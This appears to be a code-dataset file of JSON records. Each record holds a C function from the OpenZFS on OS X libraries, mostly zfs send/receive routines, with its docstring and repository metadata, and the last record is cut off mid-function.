{"docstring": "/*\n * Routines specific to \"zfs recv\"\n */\n", "func_signal": "static int\nrecv_read(libzfs_handle_t *hdl, int fd, void *buf, int ilen,\n    boolean_t byteswap, zio_cksum_t *zc)", "code": "{\n\tchar *cp = buf;\n\tint rv;\n\tint len = ilen;\n\n\tdo {\n\t\trv = read(fd, cp, len);\n\t\tcp += rv;\n\t\tlen -= rv;\n\t} while (rv > 0);\n\n\tif (rv < 0 || len != 0) {\n\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t    \"failed to read from stream\"));\n\t\treturn (zfs_error(hdl, EZFS_BADSTREAM, dgettext(TEXT_DOMAIN,\n\t\t    \"cannot receive\")));\n\t}\n\n\tif (zc) {\n\t\tif (byteswap)\n\t\t\t(void) fletcher_4_incremental_byteswap(buf, ilen, zc);\n\t\telse\n\t\t\t(void) fletcher_4_incremental_native(buf, ilen, zc);\n\t}\n\treturn (0);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * As of glibc-2.5-25 there is not support for xdr_control().  The\n * xdrmem implementation from OpenSolaris is used here.\n *\n * FIXME: Not well tested it may not work as expected.\n */\n", "func_signal": "bool_t\nxdr_control(XDR *xdrs, int request, void *info)", "code": "{\n\txdr_bytesrec_t *xptr;\n\tint32_t *int32p;\n\tint len;\n\n\tswitch (request) {\n\tcase XDR_GET_BYTES_AVAIL:\n\t\txptr = (xdr_bytesrec_t *)info;\n\t\txptr->xc_is_last_record = TRUE;\n\t\txptr->xc_num_avail = xdrs->x_handy;\n\t\treturn (TRUE);\n\n\tcase XDR_PEEK:\n\t\t/*\n\t\t * Return the next 4 byte unit in the XDR stream.\n\t\t */\n\t\tif (xdrs->x_handy < sizeof (int32_t))\n\t\t\treturn (FALSE);\n\t\tint32p = (int32_t *)info;\n\t\t*int32p = (int32_t)ntohl((uint32_t)\n\t\t    (*((int32_t *)(xdrs->x_private))));\n\t\treturn (TRUE);\n\n\tcase XDR_SKIPBYTES:\n\t\t/*\n\t\t * Skip the next N bytes in the XDR stream.\n\t\t */\n\t\tint32p = (int32_t *)info;\n\t\tlen = RNDUP((int)(*int32p));\n\t\tif (xdrs->x_handy < len)\n\t\t\treturn (FALSE);\n\t\txdrs->x_handy -= len;\n\t\txdrs->x_private += len;\n\t\treturn (TRUE);\n\n\t}\n\treturn (FALSE);\n}", "path": "zfs/lib/libspl/xdr.c", "commit_date": "2016-07-15 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Using the specified dedup table, do a lookup for an entry with\n * the checksum cs.  If found, return the block's reference info\n * in *dr. Otherwise, insert a new entry in the dedup table, using\n * the reference information specified by *dr.\n *\n * return value:  true - entry was found\n *\t\t  false - entry was not found\n */\n", "func_signal": "static boolean_t\nddt_update(libzfs_handle_t *hdl, dedup_table_t *ddt, zio_cksum_t *cs,\n    uint64_t prop, dataref_t *dr)", "code": "{\n\tuint32_t hashcode;\n\tdedup_entry_t **ddepp;\n\n\thashcode = BF64_GET(cs->zc_word[0], 0, ddt->numhashbits);\n\n\tfor (ddepp = &(ddt->dedup_hash_array[hashcode]); *ddepp != NULL;\n\t    ddepp = &((*ddepp)->dde_next)) {\n\t\tif (ZIO_CHECKSUM_EQUAL(((*ddepp)->dde_chksum), *cs) &&\n\t\t    (*ddepp)->dde_prop == prop) {\n\t\t\t*dr = (*ddepp)->dde_ref;\n\t\t\treturn (B_TRUE);\n\t\t}\n\t}\n\tddt_hash_append(hdl, ddt, ddepp, cs, prop, dr);\n\treturn (B_FALSE);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*ARGSUSED*/\n", "func_signal": "int\nuu_open_tmp(const char *dir, uint_t uflags)", "code": "{\n\tint f;\n\tchar *fname = uu_zalloc(PATH_MAX);\n\n\tif (fname == NULL)\n\t\treturn (-1);\n\n\tfor (;;) {\n\t\t(void) snprintf(fname, PATH_MAX, \"%s/uu%lld\", dir, gethrtime());\n\n\t\tf = open(fname, O_CREAT | O_EXCL | O_RDWR, 0600);\n\n\t\tif (f >= 0 || errno != EEXIST)\n\t\t\tbreak;\n\t}\n\n\tif (f >= 0)\n\t\t(void) unlink(fname);\n\n\tuu_free(fname);\n\n\treturn (f);\n}", "path": "zfs/lib/libuutil/uu_open.c", "commit_date": "2010-08-27 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Dumps a backup of the given snapshot (incremental from fromsnap if it's not\n * NULL) to the file descriptor specified by outfd.\n */\n", "func_signal": "static int\ndump_ioctl(zfs_handle_t *zhp, const char *fromsnap, uint64_t fromsnap_obj,\n    boolean_t fromorigin, int outfd, enum lzc_send_flags flags,\n    nvlist_t *debugnv)", "code": "{\n\tzfs_cmd_t zc = {\"\\0\"};\n\tlibzfs_handle_t *hdl = zhp->zfs_hdl;\n\tnvlist_t *thisdbg;\n\n\tassert(zhp->zfs_type == ZFS_TYPE_SNAPSHOT);\n\tassert(fromsnap_obj == 0 || !fromorigin);\n\n\t(void) strlcpy(zc.zc_name, zhp->zfs_name, sizeof (zc.zc_name));\n\tzc.zc_cookie = outfd;\n\tzc.zc_obj = fromorigin;\n\tzc.zc_sendobj = zfs_prop_get_int(zhp, ZFS_PROP_OBJSETID);\n\tzc.zc_fromobj = fromsnap_obj;\n\tzc.zc_flags = flags;\n\n\tVERIFY(0 == nvlist_alloc(&thisdbg, NV_UNIQUE_NAME, 0));\n\tif (fromsnap && fromsnap[0] != '\\0') {\n\t\tVERIFY(0 == nvlist_add_string(thisdbg,\n\t\t    \"fromsnap\", fromsnap));\n\t}\n\n\tif (zfs_ioctl(zhp->zfs_hdl, ZFS_IOC_SEND, &zc) != 0) {\n\t\tchar errbuf[1024];\n\t\t(void) snprintf(errbuf, sizeof (errbuf), dgettext(TEXT_DOMAIN,\n\t\t    \"warning: cannot send '%s'\"), zhp->zfs_name);\n\n\t\tVERIFY(0 == nvlist_add_uint64(thisdbg, \"error\", errno));\n\t\tif (debugnv) {\n\t\t\tVERIFY(0 == nvlist_add_nvlist(debugnv,\n\t\t\t    zhp->zfs_name, thisdbg));\n\t\t}\n\t\tnvlist_free(thisdbg);\n\n\t\tswitch (errno) {\n\t\tcase EXDEV:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"not an earlier snapshot from the same fs\"));\n\t\t\treturn (zfs_error(hdl, EZFS_CROSSTARGET, errbuf));\n\n\t\tcase EACCES:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"source key must be loaded\"));\n\t\t\treturn (zfs_error(hdl, EZFS_CRYPTOFAILED, errbuf));\n\n\t\tcase ENOENT:\n\t\t\tif (zfs_dataset_exists(hdl, zc.zc_name,\n\t\t\t    ZFS_TYPE_SNAPSHOT)) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"incremental source (@%s) does not exist\"),\n\t\t\t\t    zc.zc_value);\n\t\t\t}\n\t\t\treturn (zfs_error(hdl, EZFS_NOENT, errbuf));\n\n\t\tcase EDQUOT:\n\t\tcase EFBIG:\n\t\tcase EIO:\n\t\tcase ENOLINK:\n\t\tcase ENOSPC:\n\t\tcase ENOSTR:\n\t\tcase ENXIO:\n\t\tcase EPIPE:\n\t\tcase ERANGE:\n\t\tcase EFAULT:\n\t\tcase EROFS:\n\t\t\tzfs_error_aux(hdl, strerror(errno));\n\t\t\treturn (zfs_error(hdl, EZFS_BADBACKUP, errbuf));\n\n\t\tdefault:\n\t\t\treturn (zfs_standard_error(hdl, errno, errbuf));\n\t\t}\n\t}\n\n\tif (debugnv)\n\t\tVERIFY(0 == nvlist_add_nvlist(debugnv, zhp->zfs_name, thisdbg));\n\tnvlist_free(thisdbg);\n\n\treturn (0);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Given the GUID of a snapshot, find its containing filesystem and\n * (optionally) name.\n */\n", "func_signal": "static nvlist_t *\nfsavl_find(avl_tree_t *avl, uint64_t snapguid, char **snapname)", "code": "{\n\tfsavl_node_t fn_find;\n\tfsavl_node_t *fn;\n\n\tfn_find.fn_guid = snapguid;\n\n\tfn = avl_find(avl, &fn_find, NULL);\n\tif (fn) {\n\t\tif (snapname)\n\t\t\t*snapname = fn->fn_snapname;\n\t\treturn (fn->fn_nvfs);\n\t}\n\treturn (NULL);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Generate a send stream for the dataset identified by the argument zhp.\n *\n * The content of the send stream is the snapshot identified by\n * 'tosnap'.  Incremental streams are requested in two ways:\n *     - from the snapshot identified by \"fromsnap\" (if non-null) or\n *     - from the origin of the dataset identified by zhp, which must\n *\t be a clone.  In this case, \"fromsnap\" is null and \"fromorigin\"\n *\t is TRUE.\n *\n * The send stream is recursive (i.e. dumps a hierarchy of snapshots) and\n * uses a special header (with a hdrtype field of DMU_COMPOUNDSTREAM)\n * if \"replicate\" is set.  If \"doall\" is set, dump all the intermediate\n * snapshots. The DMU_COMPOUNDSTREAM header is used in the \"doall\"\n * case too. If \"props\" is set, send properties.\n */\n", "func_signal": "int\nzfs_send(zfs_handle_t *zhp, const char *fromsnap, const char *tosnap,\n    sendflags_t *flags, int outfd, snapfilter_cb_t filter_func,\n    void *cb_arg, nvlist_t **debugnvp)", "code": "{\n\tchar errbuf[1024];\n\tsend_dump_data_t sdd = { 0 };\n\tint err = 0;\n\tnvlist_t *fss = NULL;\n\tavl_tree_t *fsavl = NULL;\n\tstatic uint64_t holdseq;\n\tint spa_version;\n\tpthread_t tid = 0;\n\tint pipefd[2];\n\tdedup_arg_t dda = { 0 };\n\tint featureflags = 0;\n\tFILE *fout;\n\n\t(void) snprintf(errbuf, sizeof (errbuf), dgettext(TEXT_DOMAIN,\n\t    \"cannot send '%s'\"), zhp->zfs_name);\n\n\tif (fromsnap && fromsnap[0] == '\\0') {\n\t\tzfs_error_aux(zhp->zfs_hdl, dgettext(TEXT_DOMAIN,\n\t\t    \"zero-length incremental source\"));\n\t\treturn (zfs_error(zhp->zfs_hdl, EZFS_NOENT, errbuf));\n\t}\n\n\tif (zhp->zfs_type == ZFS_TYPE_FILESYSTEM) {\n\t\tuint64_t version;\n\t\tversion = zfs_prop_get_int(zhp, ZFS_PROP_VERSION);\n\t\tif (version >= ZPL_VERSION_SA) {\n\t\t\tfeatureflags |= DMU_BACKUP_FEATURE_SA_SPILL;\n\t\t}\n\t}\n\n\tif (flags->holds)\n\t\tfeatureflags |= DMU_BACKUP_FEATURE_HOLDS;\n\n\t/*\n\t * Start the dedup thread if this is a dedup stream. We do not bother\n\t * doing this if this a raw send of an encrypted dataset with dedup off\n\t * because normal encrypted blocks won't dedup.\n\t */\n\tif (flags->dedup && !flags->dryrun && !(flags->raw &&\n\t    zfs_prop_get_int(zhp, ZFS_PROP_ENCRYPTION) != ZIO_CRYPT_OFF &&\n\t    zfs_prop_get_int(zhp, ZFS_PROP_DEDUP) == ZIO_CHECKSUM_OFF)) {\n\t\tfeatureflags |= (DMU_BACKUP_FEATURE_DEDUP |\n\t\t    DMU_BACKUP_FEATURE_DEDUPPROPS);\n\t\tif ((err = socketpair(AF_UNIX, SOCK_STREAM, 0, pipefd)) != 0) {\n\t\t\tzfs_error_aux(zhp->zfs_hdl, strerror(errno));\n\t\t\treturn (zfs_error(zhp->zfs_hdl, EZFS_PIPEFAILED,\n\t\t\t    errbuf));\n\t\t}\n\t\tdda.outputfd = outfd;\n\t\tdda.inputfd = pipefd[1];\n\t\tdda.dedup_hdl = zhp->zfs_hdl;\n\t\tif ((err = pthread_create(&tid, NULL, cksummer, &dda)) != 0) {\n\t\t\t(void) close(pipefd[0]);\n\t\t\t(void) close(pipefd[1]);\n\t\t\tzfs_error_aux(zhp->zfs_hdl, strerror(errno));\n\t\t\treturn (zfs_error(zhp->zfs_hdl,\n\t\t\t    EZFS_THREADCREATEFAILED, errbuf));\n\t\t}\n\t}\n\n\tif (flags->replicate || flags->doall || flags->props ||\n\t    flags->holds || flags->backup) {\n\t\tdmu_replay_record_t drr = { 0 };\n\t\tchar *packbuf = NULL;\n\t\tsize_t buflen = 0;\n\t\tzio_cksum_t zc;\n\n\t\tZIO_SET_CHECKSUM(&zc, 0, 0, 0, 0);\n\n\t\tif (flags->replicate || flags->props || flags->backup ||\n\t\t    flags->holds) {\n\t\t\tnvlist_t *hdrnv;\n\n\t\t\tVERIFY(0 == nvlist_alloc(&hdrnv, NV_UNIQUE_NAME, 0));\n\t\t\tif (fromsnap) {\n\t\t\t\tVERIFY(0 == nvlist_add_string(hdrnv,\n\t\t\t\t    \"fromsnap\", fromsnap));\n\t\t\t}\n\t\t\tVERIFY(0 == nvlist_add_string(hdrnv, \"tosnap\", tosnap));\n\t\t\tif (!flags->replicate) {\n\t\t\t\tVERIFY(0 == nvlist_add_boolean(hdrnv,\n\t\t\t\t    \"not_recursive\"));\n\t\t\t}\n\t\t\tif (flags->raw) {\n\t\t\t\tVERIFY(0 == nvlist_add_boolean(hdrnv, \"raw\"));\n\t\t\t}\n\n\t\t\terr = gather_nvlist(zhp->zfs_hdl, zhp->zfs_name,\n\t\t\t    fromsnap, tosnap, flags->replicate, flags->raw,\n\t\t\t    flags->doall, flags->replicate, flags->verbose,\n\t\t\t    flags->backup, flags->holds, flags->props, &fss,\n\t\t\t    &fsavl);\n\t\t\tif (err)\n\t\t\t\tgoto err_out;\n\t\t\tVERIFY(0 == nvlist_add_nvlist(hdrnv, \"fss\", fss));\n\t\t\terr = nvlist_pack(hdrnv, &packbuf, &buflen,\n\t\t\t    NV_ENCODE_XDR, 0);\n\t\t\tif (debugnvp)\n\t\t\t\t*debugnvp = hdrnv;\n\t\t\telse\n\t\t\t\tnvlist_free(hdrnv);\n\t\t\tif (err)\n\t\t\t\tgoto stderr_out;\n\t\t}\n\n\t\tif (!flags->dryrun) {\n\t\t\t/* write first begin record */\n\t\t\tdrr.drr_type = DRR_BEGIN;\n\t\t\tdrr.drr_u.drr_begin.drr_magic = DMU_BACKUP_MAGIC;\n\t\t\tDMU_SET_STREAM_HDRTYPE(drr.drr_u.drr_begin.\n\t\t\t    drr_versioninfo, DMU_COMPOUNDSTREAM);\n\t\t\tDMU_SET_FEATUREFLAGS(drr.drr_u.drr_begin.\n\t\t\t    drr_versioninfo, featureflags);\n\t\t\tif (snprintf(drr.drr_u.drr_begin.drr_toname,\n\t\t\t    sizeof (drr.drr_u.drr_begin.drr_toname),\n\t\t\t    \"%s@%s\", zhp->zfs_name, tosnap) >=\n\t\t\t    sizeof (drr.drr_u.drr_begin.drr_toname)) {\n\t\t\t\terr = EINVAL;\n\t\t\t\tgoto stderr_out;\n\t\t\t}\n\t\t\tdrr.drr_payloadlen = buflen;\n\n\t\t\terr = dump_record(&drr, packbuf, buflen, &zc, outfd);\n\t\t\tfree(packbuf);\n\t\t\tif (err != 0)\n\t\t\t\tgoto stderr_out;\n\n\t\t\t/* write end record */\n\t\t\tbzero(&drr, sizeof (drr));\n\t\t\tdrr.drr_type = DRR_END;\n\t\t\tdrr.drr_u.drr_end.drr_checksum = zc;\n\t\t\terr = write(outfd, &drr, sizeof (drr));\n\t\t\tif (err == -1) {\n\t\t\t\terr = errno;\n\t\t\t\tgoto stderr_out;\n\t\t\t}\n\n\t\t\terr = 0;\n\t\t}\n\t}\n\n\t/* dump each stream */\n\tsdd.fromsnap = fromsnap;\n\tsdd.tosnap = tosnap;\n\tif (tid != 0)\n\t\tsdd.outfd = pipefd[0];\n\telse\n\t\tsdd.outfd = outfd;\n\tsdd.replicate = flags->replicate;\n\tsdd.doall = flags->doall;\n\tsdd.fromorigin = flags->fromorigin;\n\tsdd.fss = fss;\n\tsdd.fsavl = fsavl;\n\tsdd.verbose = flags->verbose;\n\tsdd.parsable = flags->parsable;\n\tsdd.progress = flags->progress;\n\tsdd.dryrun = flags->dryrun;\n\tsdd.large_block = flags->largeblock;\n\tsdd.embed_data = flags->embed_data;\n\tsdd.compress = flags->compress;\n\tsdd.raw = flags->raw;\n\tsdd.holds = flags->holds;\n\tsdd.filter_cb = filter_func;\n\tsdd.filter_cb_arg = cb_arg;\n\tif (debugnvp)\n\t\tsdd.debugnv = *debugnvp;\n\tif (sdd.verbose && sdd.dryrun)\n\t\tsdd.std_out = B_TRUE;\n\tfout = sdd.std_out ? stdout : stderr;\n\n\t/*\n\t * Some flags require that we place user holds on the datasets that are\n\t * being sent so they don't get destroyed during the send. We can skip\n\t * this step if the pool is imported read-only since the datasets cannot\n\t * be destroyed.\n\t */\n\tif (!flags->dryrun && !zpool_get_prop_int(zfs_get_pool_handle(zhp),\n\t    ZPOOL_PROP_READONLY, NULL) &&\n\t    zfs_spa_version(zhp, &spa_version) == 0 &&\n\t    spa_version >= SPA_VERSION_USERREFS &&\n\t    (flags->doall || flags->replicate)) {\n\t\t++holdseq;\n\t\t(void) snprintf(sdd.holdtag, sizeof (sdd.holdtag),\n\t\t    \".send-%d-%llu\", getpid(), (u_longlong_t)holdseq);\n\t\tsdd.cleanup_fd = open(ZFS_DEV, O_RDWR);\n\t\tif (sdd.cleanup_fd < 0) {\n\t\t\terr = errno;\n\t\t\tgoto stderr_out;\n\t\t}\n\t\tsdd.snapholds = fnvlist_alloc();\n\t} else {\n\t\tsdd.cleanup_fd = -1;\n\t\tsdd.snapholds = NULL;\n\t}\n\n\tif (flags->verbose || sdd.snapholds != NULL) {\n\t\t/*\n\t\t * Do a verbose no-op dry run to get all the verbose output\n\t\t * or to gather snapshot hold's before generating any data,\n\t\t * then do a non-verbose real run to generate the streams.\n\t\t */\n\t\tsdd.dryrun = B_TRUE;\n\t\terr = dump_filesystems(zhp, &sdd);\n\n\t\tif (err != 0)\n\t\t\tgoto stderr_out;\n\n\t\tif (flags->verbose) {\n\t\t\tif (flags->parsable) {\n\t\t\t\t(void) fprintf(fout, \"size\\t%llu\\n\",\n\t\t\t\t    (longlong_t)sdd.size);\n\t\t\t} else {\n\t\t\t\tchar buf[16];\n\t\t\t\tzfs_nicebytes(sdd.size, buf, sizeof (buf));\n\t\t\t\t(void) fprintf(fout, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"total estimated size is %s\\n\"), buf);\n\t\t\t}\n\t\t}\n\n\t\t/* Ensure no snaps found is treated as an error. */\n\t\tif (!sdd.seento) {\n\t\t\terr = ENOENT;\n\t\t\tgoto err_out;\n\t\t}\n\n\t\t/* Skip the second run if dryrun was requested. */\n\t\tif (flags->dryrun)\n\t\t\tgoto err_out;\n\n\t\tif (sdd.snapholds != NULL) {\n\t\t\terr = zfs_hold_nvl(zhp, sdd.cleanup_fd, sdd.snapholds);\n\t\t\tif (err != 0)\n\t\t\t\tgoto stderr_out;\n\n\t\t\tfnvlist_free(sdd.snapholds);\n\t\t\tsdd.snapholds = NULL;\n\t\t}\n\n\t\tsdd.dryrun = B_FALSE;\n\t\tsdd.verbose = B_FALSE;\n\t}\n\n\terr = dump_filesystems(zhp, &sdd);\n\tfsavl_destroy(fsavl);\n\tnvlist_free(fss);\n\n\t/* Ensure no snaps found is treated as an error. */\n\tif (err == 0 && !sdd.seento)\n\t\terr = ENOENT;\n\n\tif (tid != 0) {\n\t\tif (err != 0)\n\t\t\t(void) pthread_cancel(tid);\n\t\t(void) close(pipefd[0]);\n\t\t(void) pthread_join(tid, NULL);\n\t}\n\n\tif (sdd.cleanup_fd != -1) {\n\t\tVERIFY(0 == close(sdd.cleanup_fd));\n\t\tsdd.cleanup_fd = -1;\n\t}\n\n\tif (!flags->dryrun && (flags->replicate || flags->doall ||\n\t    flags->props || flags->backup || flags->holds)) {\n\t\t/*\n\t\t * write final end record.  NB: want to do this even if\n\t\t * there was some error, because it might not be totally\n\t\t * failed.\n\t\t */\n\t\tdmu_replay_record_t drr = { 0 };\n\t\tdrr.drr_type = DRR_END;\n\t\tif (write(outfd, &drr, sizeof (drr)) == -1) {\n\t\t\treturn (zfs_standard_error(zhp->zfs_hdl,\n\t\t\t    errno, errbuf));\n\t\t}\n\t}\n\n\treturn (err || sdd.err);\n\nstderr_out:\n\terr = zfs_standard_error(zhp->zfs_hdl, err, errbuf);\nerr_out:\n\tfsavl_destroy(fsavl);\n\tnvlist_free(fss);\n\tfnvlist_free(sdd.snapholds);\n\n\tif (sdd.cleanup_fd != -1)\n\t\tVERIFY(0 == close(sdd.cleanup_fd));\n\tif (tid != 0) {\n\t\t(void) pthread_cancel(tid);\n\t\t(void) close(pipefd[0]);\n\t\t(void) pthread_join(tid, NULL);\n\t}\n\treturn (err);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Check properties we were asked to override (both -o|-x)\n */\n", "func_signal": "static boolean_t\nzfs_receive_checkprops(libzfs_handle_t *hdl, nvlist_t *props,\n    const char *errbuf)", "code": "{\n\tnvpair_t *nvp;\n\tzfs_prop_t prop;\n\tconst char *name;\n\n\tnvp = NULL;\n\twhile ((nvp = nvlist_next_nvpair(props, nvp)) != NULL) {\n\t\tname = nvpair_name(nvp);\n\t\tprop = zfs_name_to_prop(name);\n\n\t\tif (prop == ZPROP_INVAL) {\n\t\t\tif (!zfs_prop_user(name)) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"invalid property '%s'\"), name);\n\t\t\t\treturn (B_FALSE);\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t\t/*\n\t\t * \"origin\" is readonly but is used to receive datasets as\n\t\t * clones so we don't raise an error here\n\t\t */\n\t\tif (prop == ZFS_PROP_ORIGIN)\n\t\t\tcontinue;\n\n\t\t/* encryption params have their own verification later */\n\t\tif (prop == ZFS_PROP_ENCRYPTION ||\n\t\t    zfs_prop_encryption_key_param(prop))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * cannot override readonly, set-once and other specific\n\t\t * settable properties\n\t\t */\n\t\tif (zfs_prop_readonly(prop) || prop == ZFS_PROP_VERSION ||\n\t\t    prop == ZFS_PROP_VOLSIZE) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"invalid property '%s'\"), name);\n\t\t\treturn (B_FALSE);\n\t\t}\n\t}\n\n\treturn (B_TRUE);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * returns snapshot creation txg\n * and returns 0 if the snapshot does not exist\n */\n", "func_signal": "static uint64_t\nget_snap_txg(libzfs_handle_t *hdl, const char *fs, const char *snap)", "code": "{\n\tchar name[ZFS_MAX_DATASET_NAME_LEN];\n\tuint64_t txg = 0;\n\n\tif (fs == NULL || fs[0] == '\\0' || snap == NULL || snap[0] == '\\0')\n\t\treturn (txg);\n\n\t(void) snprintf(name, sizeof (name), \"%s@%s\", fs, snap);\n\tif (zfs_dataset_exists(hdl, name, ZFS_TYPE_SNAPSHOT)) {\n\t\tzfs_handle_t *zhp = zfs_open(hdl, name, ZFS_TYPE_SNAPSHOT);\n\t\tif (zhp != NULL) {\n\t\t\ttxg = zfs_prop_get_int(zhp, ZFS_PROP_CREATETXG);\n\t\t\tzfs_close(zhp);\n\t\t}\n\t}\n\n\treturn (txg);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Restores a backup of tosnap from the file descriptor specified by infd.\n * Return 0 on total success, -2 if some things couldn't be\n * destroyed/renamed/promoted, -1 if some things couldn't be received.\n * (-1 will override -2, if -1 and the resumable flag was specified the\n * transfer can be resumed if the sending side supports it).\n */\n", "func_signal": "int\nzfs_receive(libzfs_handle_t *hdl, const char *tosnap, nvlist_t *props,\n\trecvflags_t *flags, int infd, avl_tree_t *stream_avl)", "code": "{\n\tchar *top_zfs = NULL;\n\tint err;\n\tint cleanup_fd;\n\tuint64_t action_handle = 0;\n\tstruct stat sb;\n\tchar *originsnap = NULL;\n\n\t/*\n\t * The only way fstat can fail is if we do not have a valid file\n\t * descriptor.\n\t */\n\tif (fstat(infd, &sb) == -1) {\n\t\tperror(\"fstat\");\n\t\treturn (-2);\n\t}\n\n#ifdef __linux__\n#ifndef F_SETPIPE_SZ\n#define\tF_SETPIPE_SZ (F_SETLEASE + 7)\n#endif /* F_SETPIPE_SZ */\n\n#ifndef F_GETPIPE_SZ\n#define\tF_GETPIPE_SZ (F_GETLEASE + 7)\n#endif /* F_GETPIPE_SZ */\n\n\t/*\n\t * It is not uncommon for gigabytes to be processed in zfs receive.\n\t * Speculatively increase the buffer size via Linux-specific fcntl()\n\t * call.\n\t */\n\tif (S_ISFIFO(sb.st_mode)) {\n\t\tFILE *procf = fopen(\"/proc/sys/fs/pipe-max-size\", \"r\");\n\n\t\tif (procf != NULL) {\n\t\t\tunsigned long max_psize;\n\t\t\tlong cur_psize;\n\t\t\tif (fscanf(procf, \"%lu\", &max_psize) > 0) {\n\t\t\t\tcur_psize = fcntl(infd, F_GETPIPE_SZ);\n\t\t\t\tif (cur_psize > 0 &&\n\t\t\t\t    max_psize > (unsigned long) cur_psize)\n\t\t\t\t\t(void) fcntl(infd, F_SETPIPE_SZ,\n\t\t\t\t\t    max_psize);\n\t\t\t}\n\t\t\tfclose(procf);\n\t\t}\n\t}\n#endif /* __linux__ */\n\n\tif (props) {\n\t\terr = nvlist_lookup_string(props, \"origin\", &originsnap);\n\t\tif (err && err != ENOENT)\n\t\t\treturn (err);\n\t}\n\n\tcleanup_fd = open(ZFS_DEV, O_RDWR);\n\tVERIFY(cleanup_fd >= 0);\n\n\terr = zfs_receive_impl(hdl, tosnap, originsnap, flags, infd, NULL, NULL,\n\t    stream_avl, &top_zfs, cleanup_fd, &action_handle, NULL, props);\n\n\tVERIFY(0 == close(cleanup_fd));\n\n\tif (err == 0 && !flags->nomount && top_zfs) {\n\t\tzfs_handle_t *zhp = NULL;\n\t\tprop_changelist_t *clp = NULL;\n\n\t\tzhp = zfs_open(hdl, top_zfs, ZFS_TYPE_FILESYSTEM);\n\t\tif (zhp != NULL) {\n\t\t\tclp = changelist_gather(zhp, ZFS_PROP_MOUNTPOINT,\n\t\t\t    CL_GATHER_MOUNT_ALWAYS|CL_GATHER_SKIP_SNAPSHOT, 0);\n\t\t\tzfs_close(zhp);\n\t\t\tif (clp != NULL) {\n\t\t\t\t/* mount and share received datasets */\n\t\t\t\terr = changelist_postfix(clp);\n\t\t\t\tchangelist_free(clp);\n\t\t\t}\n\t\t}\n\t\tif (zhp == NULL || clp == NULL || err)\n\t\t\terr = -1;\n\t}\n\tif (top_zfs)\n\t\tfree(top_zfs);\n\n\treturn (err);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Attempt to find the local dataset associated with this guid.  In the case of\n * multiple matches, we attempt to find the \"best\" match by searching\n * progressively larger portions of the hierarchy.  This allows one to send a\n * tree of datasets individually and guarantee that we will find the source\n * guid within that hierarchy, even if there are multiple matches elsewhere.\n */\n", "func_signal": "static int\nguid_to_name(libzfs_handle_t *hdl, const char *parent, uint64_t guid,\n    boolean_t bookmark_ok, char *name)", "code": "{\n\tchar pname[ZFS_MAX_DATASET_NAME_LEN];\n\tguid_to_name_data_t gtnd;\n\n\tgtnd.guid = guid;\n\tgtnd.bookmark_ok = bookmark_ok;\n\tgtnd.name = name;\n\tgtnd.skip = NULL;\n\n\t/*\n\t * Search progressively larger portions of the hierarchy, starting\n\t * with the filesystem specified by 'parent'.  This will\n\t * select the \"most local\" version of the origin snapshot in the case\n\t * that there are multiple matching snapshots in the system.\n\t */\n\t(void) strlcpy(pname, parent, sizeof (pname));\n\tchar *cp = strrchr(pname, '@');\n\tif (cp == NULL)\n\t\tcp = strchr(pname, '\\0');\n\tfor (; cp != NULL; cp = strrchr(pname, '/')) {\n\t\t/* Chop off the last component and open the parent */\n\t\t*cp = '\\0';\n\t\tzfs_handle_t *zhp = make_dataset_handle(hdl, pname);\n\n\t\tif (zhp == NULL)\n\t\t\tcontinue;\n\t\tint err = guid_to_name_cb(zfs_handle_dup(zhp), &gtnd);\n\t\tif (err != EEXIST)\n\t\t\terr = zfs_iter_children(zhp, guid_to_name_cb, &gtnd);\n\t\tif (err != EEXIST && bookmark_ok)\n\t\t\terr = zfs_iter_bookmarks(zhp, guid_to_name_cb, &gtnd);\n\t\tzfs_close(zhp);\n\t\tif (err == EEXIST)\n\t\t\treturn (0);\n\n\t\t/*\n\t\t * Remember the last portion of the dataset so we skip it next\n\t\t * time through (as we've already searched that portion of the\n\t\t * hierarchy).\n\t\t */\n\t\tgtnd.skip = strrchr(pname, '/') + 1;\n\t}\n\n\treturn 